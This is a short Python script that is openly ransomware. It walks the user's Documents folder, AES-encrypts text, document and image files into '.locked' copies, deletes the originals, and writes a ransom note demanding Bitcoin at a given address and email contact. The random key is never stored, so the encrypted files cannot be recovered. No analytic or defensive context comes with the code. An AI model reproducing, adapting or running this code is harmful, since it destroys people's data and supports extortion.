import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

key = get_random_bytes(32)  # AES-256 key
iv = get_random_bytes(16)   # Initialization vector

def encrypt_file(file_path):
    with open(file_path, "rb") as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
    with open(file_path + ".locked", "wb") as f:
        f.write(encrypted_data)
    os.remove(file_path)

def pad(data, block_size):
    return data + (block_size - len(data) % block_size) * chr(block_size - len(data) % block_size).encode()

def encrypt_dir(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith((".txt", ".doc", ".pdf", ".jpg", ".png")):
                encrypt_file(os.path.join(root, file))

def drop_ransom_note():
    note = """
    YOUR FILES ARE ENCRYPTED!
    Send 0.1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
    Contact: ransom@protonmail.com
    """
    with open("README.txt", "w") as f:
        f.write(note)

if __name__ == "__main__":
    encrypt_dir(os.path.expanduser("~/Documents"))  # Targets Documents folder
    drop_ransom_note()
